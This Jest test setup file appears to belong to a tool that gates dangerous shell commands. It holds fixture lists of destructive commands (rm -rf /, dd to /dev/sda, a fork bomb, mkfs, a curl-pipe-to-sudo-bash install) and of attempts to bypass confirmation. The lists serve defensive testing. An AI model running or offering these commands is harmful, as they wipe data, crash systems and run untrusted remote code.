import 'jest-extended';
import { TextEncoder, TextDecoder } from 'util';

// Polyfill for Node.js environment
global.TextEncoder = TextEncoder;
global.TextDecoder = TextDecoder as any;

// Suppress console output during tests unless explicitly needed
const originalConsole = { ...console };

beforeAll(() => {
  if (process.env.SHOW_TEST_LOGS !== 'true') {
    console.log = jest.fn();
    console.info = jest.fn();
    console.warn = jest.fn();
    // Keep error and debug for important messages
  }
});

afterAll(() => {
  // Restore original console
  Object.assign(console, originalConsole);
});

// Global test utilities
global.testUtils = {
  // Async delay utility
  delay: (ms: number) => new Promise(resolve => setTimeout(resolve, ms)),
  
  // Create a mock stdin stream
  createMockStdin: () => {
    const { Readable } = require('stream');
    const stdin = new Readable({
      read() {}
    });
    stdin.isTTY = true;
    stdin.setRawMode = jest.fn();
    return stdin;
  },
  
  // Create a mock process with specific properties
  createMockProcess: (overrides = {}) => ({
    pid: 12345,
    ppid: 12344,
    stdin: { isTTY: true },
    stdout: { isTTY: true },
    stderr: { isTTY: true },
    env: { ...process.env },
    cwd: () => '/test/directory',
    ...overrides,
  }),
  
  // Security test utilities
  securityTestPatterns: {
    pipeBypass: [
      'echo "y" | deliberate rm -rf /',
      'yes | deliberate rm -rf /',
      'deliberate rm -rf / < /tmp/yes.txt',
      'deliberate rm -rf / <<< "y"',
    ],
    directPath: [
      '/usr/bin/rm -rf /',
      '/bin/rm -rf /',
      '\\rm -rf /',
    ],
    escapeAttempts: [
      'deliberate rm -rf / ; echo "bypassed"',
      'deliberate rm -rf / && echo "bypassed"',
      'deliberate rm -rf / || echo "failed"',
    ],
  },
  
  // Command test fixtures
  dangerousCommands: [
    'rm -rf /',
    'rm -rf /*',
    'sudo rm -rf /',
    'dd if=/dev/zero of=/dev/sda',
    'chmod -R 777 /',
    'chown -R nobody /',
    ':(){ :|:& };:',  // Fork bomb
    'mkfs.ext4 /dev/sda',
    '> /etc/passwd',
    'curl sketchy.com/install.sh | sudo bash',
  ],
  
  safeCommands: [
    'ls',
    'ls -la',
    'pwd',
    'echo "hello"',
    'cat file.txt',
    'grep pattern file',
    'find . -name "*.js"',
    'git status',
    'npm list',
  ],
};